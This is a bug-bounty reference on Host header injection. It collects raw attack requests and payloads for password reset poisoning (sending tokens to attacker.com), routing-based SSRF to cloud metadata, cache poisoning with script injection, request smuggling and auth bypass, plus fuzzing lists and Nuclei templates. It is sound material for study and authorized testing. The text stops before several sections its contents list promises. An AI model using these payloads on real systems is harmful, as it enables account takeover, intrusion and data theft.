# Host Header Injection — Complete Research Knowledgebase

> **Research-grade reference for advanced bug bounty hunting and black-box testing.**  
> Compiled from PortSwigger Research, HackTricks, PayloadsAllTheThings, Nuclei templates, and real-world bug bounty findings.

---

## Table of Contents

1. [Basics](#basics)
2. [Host Header Theory](#host-header-theory)
3. [Host Header Routing Internals](#host-header-routing-internals)
4. [Password Reset Poisoning](#password-reset-poisoning)
5. [Routing-Based SSRF](#routing-based-ssrf)
6. [Virtual Host Bruteforce](#virtual-host-bruteforce)
7. [Authentication Bypasses](#authentication-bypasses)
8. [X-Forwarded-Host Abuse](#x-forwarded-host-abuse)
9. [X-Original-Host Abuse](#x-original-host-abuse)
10. [Forwarded Header Abuse](#forwarded-header-abuse)
11. [Internal Routing Abuse](#internal-routing-abuse)
12. [Cache Poisoning + Host Header Chains](#cache-poisoning--host-header-chains)
13. [OAuth + Host Header Chains](#oauth--host-header-chains)
14. [Request Smuggling + Host Header Chains](#request-smuggling--host-header-chains)
15. [Parser Confusion Payloads](#parser-confusion-payloads)
16. [Browser Quirks](#browser-quirks)
17. [Gadget Chains](#gadget-chains)
18. [Real World Case Studies](#real-world-case-studies)
19. [Fuzzing Payloads](#fuzzing-payloads)
20. [Automation Workflows](#automation-workflows)
21. [Recon Methodology](#recon-methodology)
22. [Nuclei Templates](#nuclei-templates)
23. [Tools and Scanners](#tools-and-scanners)
24. [Advanced Research](#advanced-research)
25. [Bug Bounty Writeups](#bug-bounty-writeups)
26. [Payload Collections](#payload-collections)
27. [WAF Bypasses](#waf-bypasses)
28. [Detection Techniques](#detection-techniques)
29. [References](#references)

---

## Basics

### What is the HTTP Host Header?

The HTTP `Host` header is a **mandatory** request header as of HTTP/1.1. It specifies the domain name that the client wants to access.

```http
GET /web-security HTTP/1.1
Host: portswigger.net
```

### Why Does It Exist?

- **Virtual hosting**: Multiple websites share the same IP address
- **Reverse proxy routing**: Load balancers and CDNs route to correct backends
- **Cloud architectures**: SaaS platforms serve multiple tenants from shared infrastructure

### The Core Problem

Off-the-shelf web applications often don't know their deployment domain unless manually configured. When they need absolute URLs (e.g., password reset emails, redirects), they may retrieve the domain from the `Host` header — which is **user-controllable**.

```php
<a href="https://$_SERVER['HOST']/support">Contact support</a>
```

This creates implicit trust in the Host header, leading to inadequate validation.

---

## Host Header Theory

### Attack Surface

HTTP Host header attacks exploit vulnerable websites that handle the value of the Host header in an unsafe way. If the server implicitly trusts the Host header and fails to validate or escape it properly, an attacker may be able to:

- Inject harmful payloads that manipulate server-side behavior
- Poison password reset emails
- Manipulate cache keys
- Route requests to internal systems
- Bypass authentication

### Common Vulnerable Patterns

1. **Generating absolute URLs** from Host header (password resets, emails)
2. **Using Host for access control decisions** (localhost = admin)
3. **Passing Host into SQL queries** without sanitization
4. **Cache key construction** using unvalidated Host values
5. **Internal routing decisions** based on Host header

### Defense Basics

- Avoid using Host header in server-side code; use relative URLs when possible
- Require current domain to be manually specified in config
- Validate Host against whitelist of permitted domains
- Don't support Host override headers (X-Forwarded-Host, etc.)
- Configure load balancers to forward only to whitelisted domains
- Avoid hosting internal-only sites on same server as public content

---

## Host Header Routing Internals

### Virtual Hosting

A single web server hosts multiple websites or applications. Each has a different domain name but shares a common IP address.

```
www.example.com      → 12.34.56.78
intranet.example.com → 10.0.0.132 (private)
```

The internal hostname may resolve to a private IP address, making it undetectable via public DNS.

### Routing via Intermediary

Websites hosted on distinct back-end servers with all traffic routed through a reverse proxy or CDN. The intermediary uses the Host header to determine the appropriate backend.

```
User → CDN/Load Balancer → Backend Server A (host: app1.com)
                        → Backend Server B (host: app2.com)
```

### Connection State Attacks

Many websites reuse connections for multiple request/response cycles. Poorly implemented HTTP servers sometimes assume the Host header is identical for all requests on the same connection.

**First-request validation**: Some proxies only apply whitelist to the first request on a connection.

```http
GET / HTTP/1.1
Host: allowed-domain.com

GET / HTTP/1.1
Host: internal-domain.com
```

**First-request routing**: Front-end uses first request's Host to decide backend, then routes all subsequent requests down the same connection.

---

## Password Reset Poisoning

### Basic Password Reset Poisoning

When a user requests a password reset, the application generates a reset link using the Host header:

```http
POST /reset-password HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

email=victim@example.com
```

If you can modify the Host header:

```http
POST /reset-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

email=victim@example.com
```

The victim receives:
```
Click here to reset your password: https://attacker.com/reset?token=SECRET
```

### Via X-Forwarded-Host

When direct Host modification is blocked:

```http
POST /reset-password HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: attacker.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

email=victim@example.com
```

The backend framework may prefer X-Forwarded-Host over Host for URL generation.

### Via Dangling Markup (Port Injection)

Some validators omit the port from Host validation:

```http
GET /example HTTP/1.1
Host: vulnerable-website.com:attacker.com
```

The domain passes validation, but the port portion may be injected into generated URLs.

### Via Duplicate Host Headers

```http
GET /example HTTP/1.1
Host: vulnerable-website.com
Host: attacker.com
```

Front-end may use first header for routing; back-end may use second for URL generation.

### Via Absolute URL + Host Mismatch

```http
GET https://vulnerable-website.com/ HTTP/1.1
Host: attacker.com
```

Front-end routes based on absolute URL; back-end uses Host header for URL generation.

### Via Line Wrapping

```http
GET /example HTTP/1.1
    Host: attacker.com
Host: vulnerable-website.com
```

Front-end may ignore indented header; back-end may parse it as part of preceding header or as duplicate.

### Connection State Password Reset Poisoning

```http
GET / HTTP/1.1
Host: example.com

POST /pwreset HTTP/1.1
Host: psres.net
```

Using first-request routing to hit the backend with a poisoned Host header.

---

## Routing-Based SSRF

### Concept

Routing-based SSRF (a.k.a. "Host Header SSRF") exploits intermediary components (load balancers, reverse proxies) that forward requests based on an unvalidated Host header. These systems sit in a privileged network position — receiving requests from the public web while having access to internal networks.

### Detection with Collaborator

```http
GET / HTTP/1.1
Host: uniqid.burpcollaborator.net
```

If you receive a DNS lookup or HTTP request from the target server or in-path system, the intermediary is routing based on Host.

### Classic Routing-Based SSRF

```http
GET / HTTP/1.1
Host: internal-website.mil
```

### Via Absolute URL Override

```http
GET http://internal-website.mil/ HTTP/1.1
Host: xxxxxxx.mil
```

Some servers whitelist the Host header but forget the request line can specify a host that takes precedence.

### Via @ Symbol Injection

```http
GET @private-intranet/example HTTP/1.1
Host: vulnerable-website.com
```

Custom proxies may prefix the path with `http://backend-server`, creating `http://backend-server@private-intranet/example` — interpreted as a request to `private-intranet` with username `backend-server`.

### Via Port + @ Confusion

```http
GET / HTTP/1.1
Host: incapsula-client.net:80@burp-collaborator.net
```

Incapsula's parsing treated this as routing to `incapsula-client.net`, but the backend converted it to `http://incapsula-client.net:80@burp-collaborator.net/` — an authentication attempt to the attacker's server.

### Internal IP Brute-Forcing

Once arbitrary public routing is confirmed, test private IP ranges:

```
192.168.0.0/16
10.0.0.0/8
172.16.0.0/12
127.0.0.0/8
```

Also scan company hostnames for private IP resolution.

### Path Normalization SSRF

Yahoo servers exhibited this behavior:

```http
GET / HTTP/1.1
Host: ../?x=.vcap.me
```

Resulted in:
```
GET /vcap.me/../?=x=.vcap.me
Host: outage.vcap.me
```

After normalization: `http://outage.vcap.me/?x=whatever` → `http://127.0.0.1/`

---

## Virtual Host Bruteforce

### Concept

Companies sometimes host public and private sites on the same server. The internal hostname may not have a public DNS record, but the server will respond to it if you can guess the name.

### Wordlist Approach

Use Burp Intruder or similar tools with wordlists:

```
intranet
admin
portal
staging
dev
api-internal
vpn
mail
jenkins
gitlab
confluence
jira
wiki
backup
old
```

### Detection

Look for:
- Different response sizes
- Different status codes
- Unique content in responses
- Internal hostnames in SSL certificates
- DNS zone transfers (if misconfigured)

### Tools

```bash
# Using ffuf
ffuf -u http://target.com -H "Host: FUZZ.target.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Using gobuster
gobuster vhost -u http://target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

---

## Authentication Bypasses

### Localhost Bypass

Applications that restrict functionality to "local users" may check the Host header:

```http
GET /admin HTTP/1.1
Host: localhost
```

**Real-world example (pyLoad CVE-2024-XXXX):**
```python
# Vulnerable code
if remote_addr in ("127.0.0.1", "::1", "localhost") or http_host in ("127.0.0.1:9666", "[::1]:9666"):
    return func(*args, **kwargs)
```

Bypass with:
```bash
curl -H "Host: 127.0.0.1:9666" http://target:8000/jdcheck.js
```

### X-Forwarded-For Bypass

```http
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
```

### Multiple IP Spoofing Headers

```http
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Client-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Forwarded: for=127.0.0.1
```

### Host Header + Localhost Combo

```http
GET /admin HTTP/1.1
Host: localhost
X-Forwarded-For: 127.0.0.1
```

### Subdomain Bypass

If filtering only checks root domain:

```http
GET / HTTP/1.1
Host: compromised-subdomain.vulnerable-website.com
```

---

## X-Forwarded-Host Abuse

### Basic Abuse

```http
GET /example HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: attacker.com
```

Many frameworks will refer to X-Forwarded-Host instead of Host when present.

### Open Graph Hijacking

```http
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: attacker.com
```

Response:
```html
<meta property="og:url" content='https://attacker.com/en'/>
```

Anyone sharing the poisoned page ends up sharing attacker-controlled content.

### Cookie Domain Override

```http
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: xyz
```

Response:
```http
Set-Cookie: locale=en; domain=xyz
```

### Script Source Hijacking

```http
GET / HTTP/1.1
Host: unity3d.com
X-Host: portswigger-labs.net
```

Response:
```html
<script src="https://portswigger-labs.net/sites/files/foo.js"></script>
```

### Route Poisoning (HubSpot)

```http
GET / HTTP/1.1
Host: www.goodhire.com
X-Forwarded-Server: canary
```

Response:
```html
<title>HubSpot - Page not found</title>
<p>The domain canary does not exist in our system.</p>
```

Register as HubSpot client, place payload, then:

```http
GET / HTTP/1.1
Host: www.goodhire.com
X-Forwarded-Host: attacker-hubspot-domain.hs-sites.com
```

---

## X-Original-Host Abuse

### X-Original-URL and X-Rewrite-URL

These headers override the request's path, originating from Symfony/Zend PHP frameworks. A huge number of PHP applications unwittingly support them.

**WAF Bypass:**
```http
GET /anything HTTP/1.1
Host: unity.com
X-Original-URL: /admin
```

**Cache Poisoning:**
```http
GET /education?x=y HTTP/1.1
Host: target.com
X-Original-URL: /gambling?x=y
```

Cache key: `/education?x=y` but content from `/gambling?x=y`.

### Other Path Override Headers

```http
X-Rewrite-URL: /admin
X-Override-URL: /admin
X-Original-Path: /admin
```

---

## Forwarded Header Abuse

### Standardized Forwarded Header

```http
Forwarded: for=192.0.2.60;proto=http;by=203.0.113.43;host=attacker.com
```

### Individual Components

```http
Forwarded: host=attacker.com
Forwarded: for="[2001:db8:cafe::17]"
Forwarded: proto=https
```

### Transition from X-Forwarded Headers

```http
# Old
X-Forwarded-For: 192.0.2.172
X-Forwarded-Host: attacker.com
X-Forwarded-Proto: https

# New standard
Forwarded: for=192.0.2.172;host=attacker.com;proto=https
```

---

## Internal Routing Abuse

### Hidden Route Poisoning (Ghost)

```http
GET / HTTP/1.1
Host: blog.cloudflare.com
X-Forwarded-Host: canary
```

Response: `302 Found → Location: https://ghost.org/fail/`

But with a registered Ghost subdomain:

```http
GET / HTTP/1.1
Host: blog.cloudflare.com
X-Forwarded-Host: attacker.ghost.io
```

Response: `302 Found → Location: http://attacker-blog.com/`

This hijacked resource loads on Cloudflare's blog. Mixed-content protections blocked HTTPS→HTTP script redirects in Chrome/Firefox, but Safari (with HSTS cache) and Edge (302 to HTTPS bypass) were vulnerable.

### SaaS Multi-Tenant Routing

Many SaaS platforms use a single system handling requests for many customers. X-Forwarded-Host or X-Forwarded-Server can misroute one customer's request to another customer's content.

---

## Cache Poisoning + Host Header Chains

### Basic Cache Poisoning

```http
GET /en?cb=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: canary
```

Response:
```html
<meta property="og:image" content="https://canary/cms/social.png" />
```

If cacheable, poison with XSS:

```http
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."><script>alert(1)</script>
```

### Discreet Poisoning (Timing Attacks)

Use `Age` and `max-age` headers to predict cache expiry:

```http
GET / HTTP/1.1
Host: unity3d.com
X-Host: portswigger-labs.net
```

Response:
```http
Age: 174
Cache-Control: public, max-age=1800
```

Cache expires in `1800 - 174 = 1626` seconds.

### Selective Poisoning (User-Agent Based)

```http
GET / HTTP/1.1
Host: redacted.com
User-Agent: Mozilla/5.0 ... Firefox/60.0
X-Forwarded-Host: a"><iframe onload=alert(1)>
```

Response:
```http
Vary: User-Agent, Accept-Encoding
```

Exploit only served to Firefox 60 users.

### DOM Poisoning (data-site-root)

```http
GET /dataset HTTP/1.1
Host: catalog.data.gov
X-Forwarded-Host: canary
```

Response:
```html
<body data-site-root="https://canary/">
```

JavaScript uses this to load internationalization data:
```javascript
fetch("https://canary/api/i18n/en")
```

Poison the translation file:
```json
{"Show more":"<svg onload=alert(1)>"}
```

### Local Route Poisoning

```http
GET / HTTP/1.1
Host: www.goodhire.com
X-Forwarded-Server: canary
```

Response showed HubSpot routing. Register own HubSpot account, then:

```http
GET / HTTP/1.1
Host: www.goodhire.com
X-Forwarded-Host: attacker.hs-sites.com
```

Cloudflare cached the response with attacker-controlled content.

### Chaining Unkeyed Inputs

```http
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: nothttps
```

Response:
```http
HTTP/1.1 301 Moved Permanently
Location: https://attacker.com/en
```

Used to steal CSRF tokens from custom HTTP headers by redirecting POST requests.

### Cache Key Normalization (Firefox Updates)

Nginx URL-decodes the cache key but forwards the raw request:

```http
GET /%3fproduct=firefox-73.0.1-complete&os=osx&lang=en-GB&force=1 HTTP/1.1
Host: download.mozilla.org
```

Back-end sees `?product=...` (broken redirect to mozilla.org), but cache key is same as legitimate request. Result: Firefox fails to update globally.

### Cache Key Injection (Akamai)

Akamai bundles key components into a string without escaping delimiters:

```http
GET /?x=2 HTTP/1.1
Origin: '-alert(1)-'__
```

Cache key: `/D/000/example.com/ cid=x=2__Origin='-alert(1)-'__`

Then victim visits:
```http
GET /?x=2__Origin='-alert(1)-' HTTP/1.1
```

Same cache key, different semantic meaning → XSS served to victim.

### Fat GET Poisoning

Varnish (without builtin.vcl) and Cloudflare forward GET request bodies without including body parameters in cache key:

```http
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```

Anyone reporting abuse would report innocent-victim instead.

### Internal Cache Poisoning (WP Rocket)

Application-level caches (like WP Rocket) cache fragments individually without cache keys:

```http
GET /page?cb=1 HTTP/1.1
Host: theblog.adobe.com
X-Forwarded-Host: collaborator-id.psres.net
```

This poisoned every page on the site, including the homepage.

### Blind Cache Poisoning

Internal caches can be poisoned for pages you don't have access to. A DoS technique broke a redirect and triggered an error page, poisoning the internal cache of a US DoD admin panel.

---

## OAuth + Host Header Chains

### Dynamic Client Registration SSRF

OAuth registration endpoints accept URL references that are fetched server-side:

```http
POST /connect/register HTTP/1.1
Host: server.example.com
Content-Type: application/json

{
  "redirect_uris": ["https://client.example.org/callback"],
  "logo_uri": "https://attacker.com/xss.html",
  "jwks_uri": "https://attacker.com/keys.jwks",
  "sector_identifier_uri": "https://attacker.com/uris.json",
  "request_uris": ["https://attacker.com/request.jwt"]
}
```

**logo_uri**: Server fetches image during authorization approval → SSRF/XSS
**jwks_uri**: Server fetches during token endpoint JWT validation → Blind SSRF
**sector_identifier_uri**: Fetched during authorization flow → SSRF
**request_uri**: Fetched at start of authorization → SSRF

### redirect_uri Session Poisoning

OAuth servers storing authorization parameters in session:

1. User visits attacker page
2. Redirects to OAuth with trusted client_id
3. Background request poisons session with untrusted client_id
4. User approves → token leaked to attacker's redirect_uri

### Host Header in OAuth Flows

The Host header can influence OAuth callback URLs, token endpoint routing, and OpenID discovery:

```http
GET /.well-known/openid-configuration HTTP/1.1
Host: attacker.com
```

May return attacker-controlled configuration, redirecting subsequent flows.

---

## Request Smuggling + Host Header Chains

### CL.TE Desync

```http
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 41

Z
Q
```

Front-end uses Content-Length (forwards blue), back-end uses Transfer-Encoding (waits for chunk → timeout).

### TE.CL Desync

```http
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 60

X
```

Front-end rejects invalid chunk size without forwarding.

### CL.0 / H2.0 Desync

Back-end ignores Content-Length entirely:

```http
POST / HTTP/1.1
Host: redacted
Content-Length: 3

xyzGET / HTTP/1.1
Host: redacted
```

### Connection State + Host Header

```http
GET / HTTP/1.1
Host: example.com

POST /pwreset HTTP/1.1
Host: psres.net
```

First-request routing allows arbitrary Host header to reach backend.

### Request Smuggling → Host Header SSRF

Smuggle a request with attacker-controlled Host to access internal APIs:

```http
POST / HTTP/1.1
Host: login.newrelic.com
Content-Length: 142
Transfer-Encoding: chunked
Transfer-Encoding: x

0

POST /login HTTP/1.1
Host: staging-alerts.newrelic.com
X-Forwarded-Proto: https
Service-Gateway-Account-Id: 934454
Service-Gateway-Is-Newrelic-Admin: true
Content-Length: 6

x=123
```

### Header Reflection for Information Disclosure

Smuggle a request that reflects POST parameters to leak internal headers:

```http
POST / HTTP/1.1
Host: login.newrelic.com
Content-Length: 142
Transfer-Encoding: chunked
Transfer-Encoding: x

0

POST /login HTTP/1.1
Host: login.newrelic.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

login[email]=asdf
```

Response leaks:
```
X-Forwarded-For: 81.139.39.150
X-Forwarded-Proto: https
X-TLS-Bits: 128
X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
x-nr-external-service: external
```

---

## Parser Confusion Payloads

### Duplicate Host Headers

```http
Host: vulnerable-website.com
Host: attacker.com
```

### Absolute URL in Request Line

```http
GET https://vulnerable-website.com/ HTTP/1.1
Host: attacker.com
```

### Line Wrapping (Space-Prefixed)

```http
GET / HTTP/1.1
    Host: attacker.com
Host: vulnerable-website.com
```

### Port Injection

```http
Host: vulnerable-website.com:attacker.com
Host: vulnerable-website.com:80@attacker.com
Host: vulnerable-website.com:443\x00attacker.com
```

### @ Symbol Injection

```http
Host: vulnerable-website.com@attacker.com
```

### Null Byte Injection

```http
Host: vulnerable-website.com%00attacker.com
```

### Unicode/Encoding Variations

```http
Host: vulnerable-website.com。attacker.com  # IDN homograph
Host: vulnerable-website.com%c0%afattacker.com  # Overlong UTF-8
```

### HTTP/2 Pseudo-Header Abuse

```http
:authority: vulnerable-website.com
host: attacker.com
```

When downgraded to HTTP/1.1, this creates duplicate Host headers.

### Double Path in HTTP/2

```
:path: /anything
:path: /admin
```

### Method Injection in HTTP/2

```
:method: GET /admin HTTP/1.1
:path: /anything
```

Downgraded to:
```http
GET /admin HTTP/1.1 /anything HTTP/1.1
Host: vulnerable-website.com
```

---

## Browser Quirks

### Safari HSTS Auto-Upgrade

If the attacker's domain is in Safari's HSTS cache, HTTP redirects are automatically upgraded to HTTPS, bypassing mixed-content protections.

### Edge Mixed-Content Bypass

Issuing a 302 redirect to a HTTPS URL completely bypasses Edge's mixed-content protection.

### Firefox SHIELD System

Firefox's SHIELD system fetches recipes via X-Forwarded-Host. If poisoned:

```http
GET /api/v1/ HTTP/1.1
Host: normandy.cdn.mozilla.net
X-Forwarded-Host: attacker.com
```

Response redirects Firefox to attacker's recipes → potential mass extension installation.

### Chrome Connection Pooling

Chrome maintains separate connection pools for:
- Requests with cookies vs. without
- Different origins

For CSD attacks, always use `credentials: 'include'` to poison the correct pool.

### Browser-Powered Desync (CSD)

Browsers can trigger desync attacks via fetch():

```javascript
fetch('https://example.com/', {
    method: 'POST',
    body: "GET /hopefully404 HTTP/1.1\r\nX: Y",
    mode: 'no-cors',
    credentials: 'include'
}).then(() => {
    location = 'https://example.com/'
})
```

---

## Gadget Chains

### Open Graph URL Gadget

```html
<meta property="og:url" content="https://attacker.com/page"/>
```

Used for social media hijacking.

### Script Import Gadget

```html
<script src="https://attacker.com/evil.js"></script>
```

### CSS Import Gadget

```css
@import url(/site/home/index.css?x=a);@import...
```

Inject malicious CSS that exfiltrates data.

### data-site-root Gadget

```html
<body data-site-root="https://attacker.com/">
```

JavaScript fetches API resources from attacker-controlled domain.

### Cookie Domain Gadget

```http
Set-Cookie: session=abc; domain=attacker.com
```

### Redirect Chain Gadget

```http
Location: https://attacker.com/en
```

### JSONP Gadget

```javascript
alert(1)//(some-data)
```

### Translation File Gadget

```json
{"Show more":"<svg onload=alert(1)>"}
```

---

## Real World Case Studies

### Case Study 1: Red Hat (Basic Cache Poisoning)

- **Target**: www.redhat.com
- **Vector**: X-Forwarded-Host → Open Graph meta tag
- **Payload**: `X-Forwarded-Host: a."><script>alert(1)</script>`
- **Cache**: Akamai CDN
- **Impact**: Stored XSS on homepage

### Case Study 2: Unity3D (Discreet Timing Poisoning)

- **Target**: unity3d.com
- **Vector**: X-Host → script import
- **Cache**: Varnish with Age/max-age headers
- **Technique**: Calculated exact cache expiry for reliable poisoning

### Case Study 3: Mozilla SHIELD (Browser System Abuse)

- **Target**: normandy.cdn.mozilla.net
- **Vector**: X-Forwarded-Host → recipe URLs
- **Impact**: Potential control over Firefox extension distribution
- **Bounty**: $1,000

### Case Study 4: Cloudflare Blog (Hidden Route Poisoning)

- **Target**: blog.cloudflare.com (Ghost-hosted)
- **Vector**: X-Forwarded-Host → Ghost subdomain redirect
- **Technique**: Registered ghost.io account, set custom domain
- **Impact**: Resource hijacking on major blog

### Case Study 5: GitHub (Fat GET Poisoning)

- **Target**: github.com
- **Vector**: Fat GET request body not in cache key
- **Impact**: Change abuse reports, issue filters, disable raw button
- **Bounty**: $10,000

### Case Study 6: data.gov (DOM Poisoning)

- **Target**: catalog.data.gov
- **Vector**: X-Forwarded-Host → data-site-root attribute
- **Chain**: data-site-root → JS fetch → i18n file → XSS translation
- **Impact**: Stored XSS via DOM translation

### Case Study 7: Yahoo (Routing SSRF)

- **Target**: ats-vm.lorax.bf1.yahoo.com
- **Vector**: Invalid Host header → Traffic Server admin port
- **Impact**: Full configuration access to load balancers
- **Bounty**: $15,000 + $5,000 (second server)

### Case Study 8: New Relic (Apache HttpComponents Bug)

- **Target**: newrelic.com
- **Vector**: `@burp-collaborator.net/` in request line
- **Root Cause**: Apache URIBuilder didn't require paths to start with `/`
- **Impact**: Access to internal admin panels

### Case Study 9: BT ISP (Covert Interception)

- **Target**: British Telecom proxies
- **Discovery**: Pingbacks from unrelated domains traced to bt.net
- **Finding**: HTTP traffic interception for copyright blocking
- **Impact**: Potential content injection for millions of users

### Case Study 10: PayPal (Request Smuggling + Cache)

- **Target**: c.paypal.com
- **Vector**: Request smuggling → Host header redirect → cache poisoning
- **Chain**: Poison JS file → iframe without CSP → parent access → password theft
- **Impact**: Plaintext password theft from login page

---

## Fuzzing Payloads

### Host Header Variations

```
attacker.com
www.attacker.com
attacker.com:80
attacker.com:443
attacker.com:8080
attacker.com%00
collaborator-id.oastify.com
oastify.com
oast.pro
interactsh.com
burpcollaborator.net
```

### X-Forwarded-Host Payloads

```
attacker.com
www.attacker.com
attacker.com:80
attacker.com:443
collaborator-id.oastify.com
```

### Localhost / Internal Payloads

```
localhost
localhost:80
localhost:443
localhost:8080
127.0.0.1
127.0.0.1:80
127.0.0.1:443
0.0.0.0
0:0:0:0:0:0:0:1
::1
192.168.1.1
10.0.0.1
172.16.0.1
169.254.169.254  # AWS metadata
```

### SSRF / Routing Payloads

```
169.254.169.254
metadata.google.internal
instance-data.ec2.internal
100.100.100.200  # Alibaba Cloud
192.0.0.192      # Oracle Cloud
```

### Encoding Variations

```
%00
%0d%0a
%20
%09
%0b
%0c
%c0%af
%u002e
```

### Domain Validation Bypasses

```
attacker.com#vulnerable-website.com
attacker.com?vulnerable-website.com
attacker.com/vulnerable-website.com
vulnerable-website.com.attacker.com
attacker-vulnerable-website.com
vulnerable-website.com.evil.com
```

---

## Automation Workflows

### Burp Suite + Param Miner

1. Install Param Miner extension
2. Use "Guess headers" to probe for supported override headers
3. Enable "Add cachebuster" to prevent accidental poisoning
4. Use "Include cachebusters in headers" for unkeyed query detection

### Collaborator Everywhere

Automatically injects payloads with unique identifiers into all proxied traffic:

```
X-Forwarded-For: a.burpcollaborator.net
True-Client-IP: b.burpcollaborator.net
Referer: http://c.burpcollaborator.net/
X-WAP-Profile: http://d.burpcollaborator.net/wap.xml
```

### HTTP Request Smuggler

```bash
# Install
java -jar burp-suite.jar  # Install from BApp Store

# Usage
# 1. Right-click request → Extensions → HTTP Request Smuggler
# 2. Select detection technique (CL.TE, TE.CL, etc.)
# 3. Use Turbo Intruder for high-speed exploitation
```

### Automated Pipeline (ZMap/ZGrab)

```bash
# Scan millions of hosts for routing-based SSRF
zmap -p 80,443 --output-fields=* | zgrab http --port 80,443
```

### Nuclei Automation

```bash
# Host header injection scan
nuclei -u https://target.com -t host-header-injection.yaml

# Header fuzzing
nuclei -u https://target.com -t header-fuzzing.yaml
```

---

## Recon Methodology

### Phase 1: Reconnaissance

1. **Map the application**
   - Identify all endpoints
   - Find admin panels, auth endpoints, APIs
   - Check robots.txt for hidden paths

2. **Observe normal behavior**
   - Document normal headers
   - Note response codes for protected resources
   - Identify custom/unusual headers

3. **DNS reconnaissance**
   ```bash
   # Subdomain enumeration
   subfinder -d target.com -all

   # DNS resolution
   dnsx -d target.com -a -aaaa -cname

   # Check for private IPs
   cat subdomains.txt | dnsx -resp-only | grep -E '^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|127\.)'
   ```

### Phase 2: Discovery

1. **Test Host header manipulation**
   - Replace with arbitrary domain
   - Test duplicate headers
   - Try absolute URL in request line
   - Test line wrapping

2. **Test override headers**
   ```
   X-Forwarded-Host
   X-Host
   X-Forwarded-Server
   X-HTTP-Host-Override
   Forwarded
   X-Original-URL
   X-Rewrite-URL
   ```

3. **Test for localhost bypass**
   ```http
   Host: localhost
   Host: 127.0.0.1
   ```

### Phase 3: Fuzzing

1. **Burp Intruder setup**
   - Send request to Intruder
   - Clear default positions
   - Add positions for header names/values
   - Load wordlists from SecLists

2. **Automated tools**
   ```bash
   # byp4xx for 403 bypass
   ./byp4xx.sh https://target.com/admin

   # headi for header injection
   headi -url http://target.com/admin

   # skip403
   python3 skip403.py -u https://target.com/admin
   ```

### Phase 4: Exploitation

1. **Password reset poisoning**
   - Modify Host or X-Forwarded-Host
   - Check email for poisoned links

2. **Cache poisoning**
   - Identify unkeyed inputs with Param Miner
   - Craft payload that reflects in response
   - Verify caching behavior

3. **Routing-based SSRF**
   - Confirm with Collaborator
   - Brute-force internal IPs
   - Access internal services

### Phase 5: Reporting

- Include exact request/response pairs
- Specify effective headers
- Document impact
- Provide CVSS score
- Include PoC code

---

## Nuclei Templates

### Basic Host Header Injection

```yaml
id: host-header-injection

info:
  name: Host Header Injection
  author: yourname
  severity: medium
  tags: host-header,injection

http:
  - method: GET
    path:
      - "{{BaseURL}}/"

    headers:
      Host: "{{randstr}}.tld"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "{{randstr}}.tld"
        part: body

      - type: status
        status:
          - 200
```

### X-Forwarded-Host Injection

```yaml
id: x-forwarded-host-injection

info:
  name: X-Forwarded-Host Header Injection
  author: yourname
  severity: medium
  tags: x-forwarded-host,injection

http:
  - method: GET
    path:
      - "{{BaseURL}}/"

    headers:
      X-Forwarded-Host: "{{randstr}}.tld"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "{{randstr}}.tld"
        part: body

      - type: status
        status:
          - 200
```

### OpenVPN Host Header Injection

```yaml
id: openvpn-hhi

info:
  name: OpenVPN Host Header Injection
  author: dheerajmadhukar
  severity: info
  tags: openvpn,hhi

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{randstr}}.tld

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "https://{{randstr}}.tld/__session_start__/"
          - "openvpn_sess"
        part: header
        condition: and

      - type: status
        status:
          - 302
```

### SSRF via X-Forwarded-Host (Azure)

```yaml
id: ssrf-azure-metadata

info:
  name: SSRF via X-Forwarded-Host
  author: pdteam
  severity: high

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    headers:
      X-Forwarded-Host: "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
      Metadata: true

    matchers:
      - type: word
        part: body
        words:
          - compute
          - azEnvironment
          - resourceGroupName
        condition: or
```

### Fuzzing Template (Nuclei v3.2+)

```yaml
id: host-header-fuzzing

info:
  name: Host Header Fuzzing
  author: yourname
  severity: critical

http:
  - method: GET
    path:
      - "{{BaseURL}}{{path}}"

    fuzzing:
      - part: header
        type: replace
        mode: multiple
        keys:
          - Host
          - X-Forwarded-Host
          - X-Host
          - X-Forwarded-Server
          - X-HTTP-Host-Override

        fuzz:
          - "{{interactsh-url}}"
          - "{{randstr}}.oastify.com"
          - "localhost"
          - "127.0.0.1"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
```

---

## Tools and Scanners

### Burp Suite Extensions

| Extension | Purpose | Source |
|-----------|---------|--------|
| Param Miner | Guess headers, detect unkeyed inputs | BApp Store |
| HTTP Request Smuggler | Detect and exploit request smuggling | BApp Store |
| Turbo Intruder | High-speed HTTP attacks | BApp Store |
